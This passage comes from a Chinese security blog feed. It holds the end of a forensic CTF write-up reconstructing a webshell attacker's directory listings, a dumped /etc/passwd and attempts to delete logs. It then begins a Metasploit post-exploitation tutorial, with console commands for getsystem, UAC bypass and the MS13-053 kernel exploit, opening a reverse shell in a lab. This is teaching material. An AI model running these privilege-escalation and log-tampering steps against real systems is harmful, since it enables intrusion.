class="line">inputrc 2010-01-12 21:28:22 942 0644</span><br><span class="line">pm-utils-hd-apm-restore.conf    2012-07-18 17:04:08 370 0644</span><br><span class="line">.pwd.lock   1970-01-01 08:00:00     0</span><br><span class="line">libuser.conf    2016-07-11 23:58:43 2290    0644</span><br><span class="line">sudo-ldap.conf  2013-10-07 20:51:58 3181    0640</span><br><span class="line">mailcap 2009-11-18 05:13:33 272 0644</span><br><span class="line">bluetooth   1970-01-01 08:00:00     0</span><br><span class="line">selinux 1970-01-01 08:00:00     0</span><br><span class="line">mime.types  2011-09-23 23:02:51 43591   0644</span><br><span class="line">rc.sysinit  1970-01-01 08:00:00     0</span><br><span class="line">hosts.allow 2010-01-12 21:28:22 370 0644</span><br><span class="line">magic   2012-10-04 22:51:04 111 0644</span><br><span class="line">my.cnf  2016-05-11 14:31:18 251 0644</span><br><span class="line">sysctl.conf 2013-11-23 05:20:24 1150    0644</span><br><span class="line">crypttab    2016-07-11 23:45:38 0   0644</span><br><span class="line">nanorc  2010-11-12 15:18:32 7846    0644</span><br><span class="line">man.config  2013-02-22 10:13:09 4940    0644</span><br><span class="line">csh.cshrc   2013-10-02 17:06:18 1602    0644</span><br><span class="line">yum.conf    2013-02-22 19:26:34 969 0644</span><br><span class="line">securetty   2010-01-12 21:28:22 122 0600</span><br><span class="line">bashrc  2013-10-02 17:06:18 2681    0644</span><br><span class="line">group   2016-07-16 02:31:22 774 0644</span><br><span class="line">libaudit.conf   2012-03-02 02:42:34 191 0640</span><br><span class="line">pbm2ppa.conf    2010-08-23 07:28:29 1362    0644</span><br><span class="line">gshadow 1970-01-01 08:00:00     0</span><br><span class="line">protocols   2010-01-12 21:28:22 6455    0644</span><br><span class="line">dnsmasq.conf    2013-02-22 12:40:04 21214   0644</span><br><span class="line">hosts   2010-01-12 21:28:22 158 0644</span><br><span class="line">shadow  1970-01-01 08:00:00     0</span><br><span class="line">passwd- 2016-07-11 23:59:08 1435    0644</span><br><span class="line">vimrc   2012-02-17 23:17:03 1962    0644</span><br><span class="line">quotatab    2013-11-22 19:32:14 259 0644</span><br><span class="line">environment 2013-10-02 17:06:18 0   0644</span><br><span class="line">portreserve 10-01-01 08:00:00       0</span><br><span class="line">anacrontab  2013-11-23 20:43:13 541 0600</span><br><span class="line">issue.net   2013-11-27 19:53:33 46  0644</span><br><span class="line">centos-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">aliases 1970-01-01 08:00:00     0</span><br><span class="line">mtab    2016-07-16 01:08:53 444 0644</span><br><span class="line">quotagrpadmins  2008-10-14 01:29:19 220 0644</span><br><span class="line">sudo.conf   2012-09-25 23:46:01 1786    0640</span><br><span class="line">favicon.png 2007-01-25 05:13:36 918 0644</span><br><span class="line">exports 2010-01-12 21:28:22 0   0644</span><br><span class="line">sestatus.conf   2013-11-23 06:44:51 216 0644</span><br><span class="line">printcap    2010-01-12 21:28:22 233 0644</span><br><span class="line">rsyslog.conf    1970-01-01 08:00:00     0</span><br><span class="line">gshadow-    1970-01-01 08:00:00     0</span><br><span class="line">DIR_COLORS.256color 2013-10-17 20:51:45 5139    0644</span><br><span class="line">ld.so.conf  2013-07-25 02:50:25 28  0644</span><br><span class="line">DIR_COLORS  2013-10-17 20:51:45 4439    0644</span><br><span class="line">rc.local    2016-07-11 23:59:08 220 0755</span><br><span class="line">system-release-cpe  2013-11-27 19:53:33 25  0644</span><br><span class="line">grub.conf   1970-01-01 08:00:00     0</span><br><span class="line">localtime   2016-07-11 23:58:41 2819    0644</span><br><span class="line">virc    2012-02-17 23:17:03 1962    0644</span><br><span class="line">prelink.conf    2013-07-19 22:35:49 789 0644</span><br><span class="line">services    2013-10-02 17:06:18 641020  0644</span><br><span class="line">kdump.conf  2016-07-11 23:54:24 7786    0644</span><br><span class="line">tpvmlp.conf 2016-07-16 01:01:27 1309    0644</span><br><span class="line">host.conf   2013-10-02 17:06:18 9   0644</span><br><span class="line">ethers  2012-05-10 16:17:31 28  0644</span><br><span class="line">issue   2013-11-27 19:53:33 47  0644</span><br><span class="line">pinforc 2010-08-21 09:43:26 2872    0644</span><br><span class="line">drirc   2013-11-25 20:52:10 1804    0644</span><br><span class="line">pnm2ppa.conf    2010-08-23 07:28:29 6300    0644</span><br><span class="line">redhat-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">dracut.conf 2013-11-26 18:58:48 519 0644</span><br><span class="line">updatedb.conf   1970-01-01 08:00:00     0</span><br><span class="line">inittab 2016-07-12 00:03:18 884 0644</span><br><span class="line">sudoers 2012-03-02 01:18:24 4002    0440</span><br><span class="line">odbc.ini    2014-07-10 16::09   0   0644</span><br><span class="line">adjtime 1970-01-01 08:00:00     0</span><br><span class="line">csh.login   2013-10-02 17:06:18 794 0644</span><br><span class="line">group-  2016-07-11 23:59:08 762 0600</span><br><span class="line">pear.conf   2016-05-11 06:42:17 946 0644</span><br><span class="line">wgetrc  2012-10-10 17:06:54 4479    0644</span><br><span class="line">shadow- 1970-01-01 08:00:00     0</span><br><span class="line">fstab   2016-07-12 00:03:17 805 0644</span><br><span class="line">audit   1970-01-01 08:00:00     0</span><br><span class="line">nsswitch.conf   2010-05-05 03:22:21 1688    0644</span><br><span class="line">NetworkManager  1970-01-01 08:00:00     0</span><br><span class="line">warnquota.conf  2013-11-22 19:32:22 3008    0644</span><br><span class="line">login.defs  2016-07-11 23:58:43 1831    0644</span><br><span class="line">mke2fs.conf 2009-09-08 05:02:53 801 0644</span><br><span class="line">DIR_COLORS.lightbgcolor 2013-10-17 20:51:45 4113    0644</span><br><span class="line">prelink.cache   1970-01-01 08:00:00     0</span><br><span class="line">passwd.OLD  2016-07-11 23:59:08 1429    0644</span><br><span class="line">mtools.conf 2010-08-17 05:28:51 2620    0644</span><br><span class="line">readahead.conf  2013-11-23 21:52:17 966 0644</span><br><span class="line">fprintd.conf    2013-11-22 22:35:33 20  0644</span><br><span class="line">rwtab   2013-11-23 05:20:24 930 0644</span><br><span class="line">mail.rc 2013-08-01 17:12:47 1909    0644</span><br><span class="line">shadow.bak  2016-07-28 17:40:52 844 0755</span><br><span class="line">smartd.conf 2013-02-22 06:26:22 6717    0644</span><br><span class="line">odbcinst.ini    2014-07-10 16:15:09 575 0644</span><br><span class="line">gai.conf    2013-11-22 05:24:28 0   0644</span><br><span class="line">php.ini 2016-05-11 05:42:18 69097   0644</span><br><span class="line">crontab 1970-01-01 08:00:00     0</span><br><span class="line">ld.so.cache 2016-08-01 11:01:41 53651   0644</span><br><span class="line">system-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">aliases.db  1970-01-01 08:00:00     0</span><br><span class="line">passwd  2016-07-16 02:31:22 1487    0644</span><br><span class="line">top.ini 2016-08-10 14:15:01 0   0644</span><br><span class="line">modprobe.d  1970-01-01 08:00:00     0</span><br><span class="line">enscript.cfg    2010-11-11 14:44:35 4843    0644</span><br><span class="line">rpc 2010-05-04 19:27:23 1615    0644</span><br><span class="line">cron.deny   2013-11-23 20:43:13 0   0600</span><br><span class="line">cron.d  1970-01-01 08:00:00     0</span><br><span class="line">shells  2016-07-113:54:44   61  0644</span><br><span class="line">profile 2013-10-02 17:06:18 1796    0644</span><br><span class="line">asound.conf 2009-05-15 04:53:38 148 0644</span><br><span class="line">logrotate.conf  2007-08-29 15:19:36 662 0644</span><br><span class="line">filesystems 2013-10-02 17:06:18 64  0644</span><br><span class="line">krb5.conf   2013-08-29 01:33:13 449 0644</span><br><span class="line">sos.conf    2013-11-23 03:12:07 260 0644</span><br><span class="line">rc  1970-01-01 08:00:00     0</span><br><span class="line">resolv.conf 2016-07-25 11:57:19 49  0644</span><br></pre></td></tr></table></figure></p><p>接下来查看<code>/etc/shadow</code>这个文件，但是没看到，估计是因为权限不够<br>接下来查看<code>/etc/passwd-</code><br>获得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">|root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin</span><br><span class="line">vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin</span><br><span class="line">rtkit:x:499:497:RealtimeKit:/proc:/sbin/nologin</span><br><span class="line">avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin</span><br><span class="line">abrt:x:173:173::/etc/abrt:/sbin/nologin</span><br><span class="line">haldaemon:x:68:68:HAL daemon:/:/sbin/nologin</span><br><span class="line">gdm:x:42:42::/var/lib/gdm:/sbin/nologin</span><br><span class="line">ntp:x:38:38::/etc/ntp:/sbin/nologin</span><br><span class="line">apache:x:48:48:Apache:/var/www:/sbin/nologin</span><br><span class="line">saslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">pulse:x:497:496:PulseAudio Syst Daemon:/var/run/pulse:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">tcpdump:x:72:72::/:/sbin/nologin</span><br><span class="line">simple:x:500:500:Simple:/home/simple:/bin/bash</span><br></pre></td></tr></table></figure><p>接下来<code>/home</code>里面<br>没看到东西。<br>接下来查看<code>/opt/</code>底下<br>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">./  2016-07-12 00:03:18 4096    0755</span><br><span class="line">rh/ 2013-11-22 18:16:37 4096    0755</span><br></pre></td></tr></table></figure><p>接下来又傻逼的查看<code>/home</code>里面<br>没看到东西。<br>接下来查看<code>/var/</code>里面<br>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">db/ 2016-07-11 23:54:42 4096    0755</span><br><span class="line">lib/    2016-07-16 02:31:24 4096    0755</span><br><span class="line">lock/   2016-08-09 18:16:02 4096    0775</span><br><span class="line">tmp/    2016-08-08 09:46:00 4096    1777</span><br><span class="line">spool/  2016-07-11 23:54:43 4096    0755</span><br><span class="line">run/    2016-08-10 00:35:03 4096    0755</span><br><span class="line">cache/  2016-07-16 02:33:57 4096    0755</span><br><span class="line">crash/  2013-11-23 09:15:37 4096    0755</span><br><span class="line">gdm/    2013-11-22 23:54:18 4096    1770</span><br><span class="line">preserve/   2011-09-23 19:50:20 4096    0755</span><br><span class="line">account/    2016-07-11 23:54:44 4096    0755</span><br><span class="line">www/    2016-08-04 10:37:16 4096    0755</span><br><span class="line">empty/  2016-07-11 23:54:25 4096    0755</span><br><span class="line">log/    2016-08-07 18:36:03 4096    0755</span><br><span class="line">nis/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">local/  2011-09-23 19:50:20 4096    0755</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">opt/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">./  2016-07-22 19:50:16 4096    0755</span><br><span class="line">yp  1970-01-01 08:00:00     0</span><br><span class="line">abc 1970-01-01 08:00:00     0</span><br><span class="line">games   1970-01-01 08:00:00     0</span><br><span class="line">mail    1970-01-01 08:00:00     0</span><br></pre></td></tr></table></figure><p>接下来查看<code>/var/log/</code><br>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">ntpstats/   2013-11-24 02:21:54 4096    0755</span><br><span class="line">samba/  2016-07-11 23:52:01 4096    0700</span><br><span class="line">cups/   2013-08-17 18:21:22 4096    0755</span><br><span class="line">httpd/  2016-08-07 18:36:02 4096    0700</span><br><span class="line">gdm/    2016-07-16 01:01:33 4096    1770</span><br><span class="line">sa/ 2016-08-09 15:00:01 4096    0755</span><br><span class="line">../ 2016-07-22 19:50:16 4096    0755</span><br><span class="line">ppp/    2010-08-23 07:22:22 4096    0700</span><br><span class="line">./  2016-08-07 18:36:03 4096    0755</span><br><span class="line">prelink/    2016-07-16 02:16:57 4096    0755</span><br><span class="line">ConsoleKit/ 2016-07-12 00:03:21 4096    0755</span><br><span class="line">vmware-caf/ 2016-07-12 00:01:49 4096    0755</span><br><span class="line">secure  2016-08-10 14:10:25 997 0600</span><br><span class="line">maillog-20160724    2016-07-22 19:34:03 3589    0600</span><br><span class="line">yum.log 2016-08-01 14:59:17 1907    0600</span><br><span class="line">anaconda.program.log    2016-07-11 23:59:08 31242   0600</span><br><span class="line">pm-powersave.log    2016-07-16 01:01:34 89  0644</span><br><span class="line">cron    2016-08-10 14:18:01 360975  0600</span><br><span class="line">cron-20160724   2016-07-25 12:43:01 101645  0600</span><br><span class="line">wtmp    2016-08-10 14:10:25 51072   0664</span><br><span class="line">messages-20160724   2016-07-25 11:57:19 21952   0600</span><br><span class="line">Xorg.0.log.old  2016-07-12 00:15:52 50682   0644</span><br><span class="line">wpa_supplicant.log  2016-07-12 00:00:29 0   0644</span><br><span class="line">anaconda.syslog 2016-07-11 23:59:08 148754  0600</span><br><span class="line">anaconda.ifcfg.log  2016-07-11 23:59:08 2657    0600</span><br><span class="line">anaconda.storage.log    2016-07-11 23:59:08 109194  0600</span><br><span class="line">Xorg.1.log  2016-07-12 00:14:50 50448   0644</span><br><span class="line">cron-20160807   2016-08-07 18:36:03 606821  0600</span><br><span class="line">spooler-20160807    2016-07-31 18:37:02 0   0600</span><br><span class="line">Xorg.0.log  2016-08-09 14:01:46 83699   0644</span><br><span class="line">btm2016-08-10 14:06:03  9600    0600</span><br><span class="line">anaconda.xlog   2016-07-11 23:59:08 35088   0600</span><br><span class="line">boot.log    2016-07-16 01:01:29 2959    0644</span><br><span class="line">secure-20160807 2016-08-05 20:01:06 27030   0600</span><br><span class="line">messages-20160717   2016-07-16 02:41:58 285781  0600</span><br><span class="line">spooler 2016-08-07 18:36:03 0   0600</span><br><span class="line">vmware-vmsvc.log    2016-07-25 11:29:49 4779    0644</span><br><span class="line">tallylog    2016-07-11 23:47:58 0   0600</span><br><span class="line">spice-vdagent.log   2016-07-12 00:00:17 0   0600</span><br><span class="line">vmware-vmusr.log    2016-08-03 11:04:06 10063   0644</span><br><span class="line">mysqld.log.rpmsave  2016-07-16 02:41:39 1672    0640</span><br><span class="line">maillog 2016-08-09 18:16:11 1795    0600</span><br><span class="line">dmesg.old   2016-07-11 23:59:43 89000   0644</span><br><span class="line">maillog-20160731    2016-07-30 18:32:35 4173    0600</span><br><span class="line">spooler-20160717    2016-07-11 23:51:44 0   0600</span><br><span class="line">cron-20160717   2016-07-17 18:16:01 35440   0600</span><br><span class="line">maillog-20160807    2016-08-06 18:16:04 4195    0600</span><br><span class="line">maillog-20160717    2016-07-16 18:22:11 1590    0600</span><br><span class="line">spooler-20160724    2016-07-17 18:16:01 0   0600</span><br><span class="line">spooler-20160731    2016-07-25 12:43:02 0   0600</span><br><span class="line">vmware-tools-upgrader.log   2016-07-12 00:03:18 363533  0644</span><br><span class="line">audit   1970-01-01 08:00:00     0</span><br><span class="line">anaconda.log    2016-07-11 23:59:08 20411   0600</span><br><span class="line">messages-20160731   2016-07-28 10:27:06 1884    0600</span><br><span class="line">secure-20160724 2016-07-23 00:21:37 1654    0600</span><br><span class="line">lastlog 2016-08-10 14:06:12 146292  0644</span><br><span class="line">btmp-20160801   2016-08-01 11:33:21 14976   0600</span><br><span class="line">anaconda.yum.log    2016-07-11 23:59:08 99366   0600</span><br><span class="line">dmesg   2016-07-16 01:00:10 90056   0644</span><br><span class="line">Xorg.2.log  2016-07-12 00:15:24 38224   0644</span><br><span class="line">mysqld.log  2016-07-16 02:43:47 1367    0640</span><br><span class="line">vmware-install.log  2016-07-12 00:03:18 5359    0644</span><br><span class="line">secure-20160717 2016-07-16 03:13:18 7399    0600</span><br><span class="line">secur20160731   2016-07-29 17:36:01 8445    0600</span><br><span class="line">messages-20160807   2016-08-07 06:04:01 34355   0600</span><br><span class="line">cron-20160731   2016-07-31 18:37:01 120163  0600</span><br><span class="line">messages    2016-08-10 02:42:01 468 0600</span><br><span class="line">dracut.log  2016-07-12 00:03:09 345367  0644</span><br></pre></td></tr></table></figure><p>接下来想删除掉<code>/var/log/yum.log</code>，看样子失败了<br>接下来查看<code>/var/empty/</code>,得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sshd/   2013-11-23 06:40:03 4096    0711</span><br><span class="line">../ 2016-07-22 19:50:16 4096    0755</span><br><span class="line">./  2016-07-11 23:54:25 4096    0755</span><br></pre></td></tr></table></figure><p>接下来，读取<code>/var/log/yum.log</code>的内容，，失败<br>好吧，，又想删除<code>/var/log/yum.log</code>,还是失败</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-题目&quot;&gt;&lt;a href=&quot;#0x00-题目&quot; class=&quot;headerlink&quot; title=&quot;0x00 题目&quot;&gt;&lt;/a&gt;0x00 题目&lt;/h2&gt;&lt;p&gt;下载链接: &lt;a href=&quot;https://pan.baidu.com/s/1bq9Zvun&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;数据赛 密码：wabt  解压密码：t3sectimu&lt;/a&gt;&lt;br&gt;题目要求:&lt;br&gt;背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。&lt;br&gt;问题：&lt;/p&gt;
&lt;p&gt;（1）黑客最终获得了什么用户名&lt;br&gt;（2）黑客最终获得了什么密码&lt;br&gt;（3）黑客修改了什么文件&lt;br&gt;（4）黑客使用菜刀的完整连接地址&lt;br&gt;（5）黑客使用菜刀的连接密码&lt;br&gt;(6)黑客的查看的第一个文件目录是什么&lt;br&gt;
    
    </summary>
    
      <category term="取证" scheme="http://www.daikersec.com/categories/%E5%8F%96%E8%AF%81/"/>
    
      <category term="流量分析" scheme="http://www.daikersec.com/categories/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="wireshark" scheme="http://www.daikersec.com/tags/wireshark/"/>
    
      <category term="数据分析" scheme="http://www.daikersec.com/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
    
      <category term="取证" scheme="http://www.daikersec.com/tags/%E5%8F%96%E8%AF%81/"/>
    
      <category term="日志分析" scheme="http://www.daikersec.com/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
      <category term="流量分析" scheme="http://www.daikersec.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>metasploit在后渗透中的作用</title>
    <link href="http://www.daikersec.com/wiki/9668f403.html"/>
    <id>http://www.daikersec.com/wiki/9668f403.html</id>
    <published>2018-03-19T05:23:50.000Z</published>
    <updated>2018-05-21T03:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。</p><h2 id="0x01-权限提升"><a href="#0x01-权限提升" class="headerlink" title="0x01 权限提升"></a>0x01 权限提升</h2><a id="more"></a><ol><li><p>getsystem</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: TEST\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></li><li><p>bypassuac</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.161.138:4444</span><br></pre></td></tr></table></figure><ol start="3"><li>利用windows提权漏洞进行提升</li></ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(windows/local/bypassuac_vbs) &gt; use post/windows/gather/enum_patches </span><br><span class="line">msf post(windows/gather/enum_patches) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf post(windows/gather/enum_patches) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[*] KB2778930 applied</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf post(windows/gather/enum_patches) &gt; search MS13-053</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                        Disclosure Date  Rank     Description</span><br><span class="line">   ----                                        ---------------  ----     -----------</span><br><span class="line">   exploit/windows/local/ms13_053_schlamperei  2013-12-01       average  Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)</span><br><span class="line">   exploit/windows/local/ppr_flatten_rec       2013-05-15       average  Windows EPATHOBJ::pprFlattenRec Local Privilege Escalation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf post(windows/gather/enum_patches) &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf exploit(windows/local/ms13_053_schlamperei) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms13_053_schlamperei):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 SP0/SP1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/ms13_053_schlamperei) &gt; </span><br><span class="line">msf exploit(windows/local/ms13_053_schlamperei) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/local/ms13_053_schlamperei) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.161.138:4444 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 2980 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 2980...</span><br><span class="line">[*] Injecting exploit into 2980...</span><br><span class="line">[*] Found winlogon.exe with PID 432</span><br><span class="line">[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.161.132</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.161.138:4444 -&gt; 192.168.161.132:49959) at 2018-03-19 16:56:51 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2 id="0x02-域管理员嗅探"><a href="#0x02-域管理员嗅探" class="headerlink" title="0x02 域管理员嗅探"></a>0x02 域管理员嗅探</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 